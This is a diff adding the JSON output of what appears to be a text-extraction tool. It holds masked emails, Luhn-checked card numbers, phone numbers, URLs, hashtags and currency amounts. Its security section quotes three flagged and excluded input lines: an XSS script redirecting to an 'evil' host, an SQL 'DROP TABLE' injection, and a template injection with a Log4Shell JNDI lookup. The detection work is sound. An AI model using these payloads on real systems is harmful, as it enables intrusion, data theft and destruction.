@@ -1,0 +1,206 @@
+{
+  "meta": {
+    "generated_at_utc": "2026-09-05T22:24:14+00:00",
+    "source_file": "input/raw-text.txt",
+    "note": "Sensitive values (emails, card numbers) are masked. Lines flagged as hostile were excluded from extraction."
+  },
+  "security": {
+    "flagged_lines_count": 3,
+    "flagged_lines": [
+      {
+        "line_number": 37,
+        "threats_detected": [
+          "html_script_tag"
+        ],
+        "line_preview_redacted": "name: <script>alert('xss')document.location='http://evil.exa...[truncated]",
+        "action": "line_excluded_from_extraction"
+      },
+      {
+        "line_number": 38,
+        "threats_detected": [
+          "sql_injection"
+        ],
+        "line_preview_redacted": "comment: '); DROP TABLE tickets;--",
+        "action": "line_excluded_from_extraction"
+      },
+      {
+        "line_number": 39,
+        "threats_detected": [
+          "template_injection",
+          "jndi_log4shell"
+        ],
+        "line_preview_redacted": "comment2: {{7*7}}${jndi:ldap://malicious.example.com/a}",
+        "action": "line_excluded_from_extraction"
+      }
+    ]
+  },
+  "extracted_data": {
+    "emails": {
+      "alu_official": [
+        {
+          "masked": "a*********e@alueducation.com",
+          "domain": "alueducation.com"
+        },
+        {
+          "masked": "f**********k@alueducation.com",
+          "domain": "alueducation.com"
+        },
+        {
+          "masked": "s*****t@alueducation.com",
+          "domain": "alueducation.com"
+        }
+      ],
+      "alu_alumni": [
+        {
+          "masked": "a****u@alumni.alueducation.com",
+          "domain": "alumni.alueducation.com"
+        },
+        {
+          "masked": "j**********a@alumni.alueducation.com",
+          "domain": "alumni.alueducation.com"
+        }
+      ],
+      "alu_si": [
+        {
+          "masked": "s*****p@si.alueducation.com",
+          "domain": "si.alueducation.com"
+        },
+        {
+          "masked": "r*******r@si.alueducation.com",
+          "domain": "si.alueducation.com"
+        },
+        {
+          "masked": "s******n@si.alueducation.com",
+          "domain": "si.alueducation.com"
+        }
+      ],
+      "general": [
+        {
+          "masked": "a*********e@gmail.com",
+          "domain": "gmail.com"
+        },
+        {
+          "masked": "a*******8@yahoo.co.uk",
+          "domain": "yahoo.co.uk"
+        }
+      ]
+    },
+    "credit_cards": {
+      "valid": [
+        {
+          "masked": "************6467",
+          "network": "Visa",
+          "luhn_check": "passed"
+        },
+        {
+          "masked": "************9424",
+          "network": "Discover",
+          "luhn_check": "passed"
+        },
+        {
+          "masked": "************4444",
+          "network": "Mastercard",
+          "luhn_check": "passed"
+        },
+        {
+          "masked": "***********0005",
+          "network": "American Express",
+          "luhn_check": "passed"
+        }
+      ],
+      "rejected": [
+        {
+          "masked": "************3456",
+          "reason": "failed_luhn_checksum, unrecognized_network_prefix"
+        },
+        {
+          "masked": "***************0000",
+          "reason": "unrecognized_network_prefix"
+        },
+        {
+          "masked": "***********1111",
+          "reason": "failed_luhn_checksum, unrecognized_network_prefix"
+        }
+      ]
+    },
+    "phone_numbers": {
+      "valid": [
+        {
+          "formatted": "+250 788 123 456",
+          "digit_count": 12
+        },
+        {
+          "formatted": "(415) 555-0192",
+          "digit_count": 10
+        },
+        {
+          "formatted": "0792887129",
+          "digit_count": 10
+        },
+        {
+          "formatted": "0788-123-456",
+          "digit_count": 10
+        },
+        {
+          "formatted": "+1 (650) 555-0123 ext. 22",
+          "digit_count": 11
+        },
+        {
+          "formatted": "4242-4242-4242",
+          "digit_count": 12
+        },
+        {
+          "formatted": "555.123.4567",
+          "digit_count": 10
+        },
+        {
+          "formatted": "+44 20 7946 0958",
+          "digit_count": 12
+        },
+        {
+          "formatted": "+254 (0) 712 345678",
+          "digit_count": 13
+        }
+      ],
+      "rejected": []
+    },
+    "urls": {
+      "https_secure": [
+        "https://support.alueducation.com/tickets/10233?ref=chat",
+        "https://billing.example.com/invoices/2026/09/INV-98213.pdf?token=abc123&user=44",
+        "https://pay.alustudent.com/receipts/9981",
+        "https://alueducation.com/news?id=204",
+        "https://docs.alueducation.com/guide/setup#step-3"
+      ],
+      "http_insecure": [
+        "http://status.alu.dev/",
+        "http://bit.ly/3xAmPl3",
+        "http://192.168.1.42:8080/status"
+      ],
+      "informal_no_scheme_unverified": [
+        "www.uwase-portfolio.rw"
+      ]
+    },
+    "hashtags": [
+      "#ALUSupport",
+      "#CustomerCare2026",
+      "#250Tech",
+      "#MadeInRwanda",
+      "#GraduationDay2026",
+      "#ALUFamily",
+      "#TechForGood"
+    ],
+    "currency_amounts": [
+      "$1,250.00",
+      "RWF 45,000",
+      "€89.99",
+      "¥14,200",
+      "KES 3,500.00",
+      "$12,000.00 USD",
+      "RWF 2,000,000",
+      "1250 USD",
+      "$0.99",
+      "GBP 45.5"
+    ]
+  }
+}
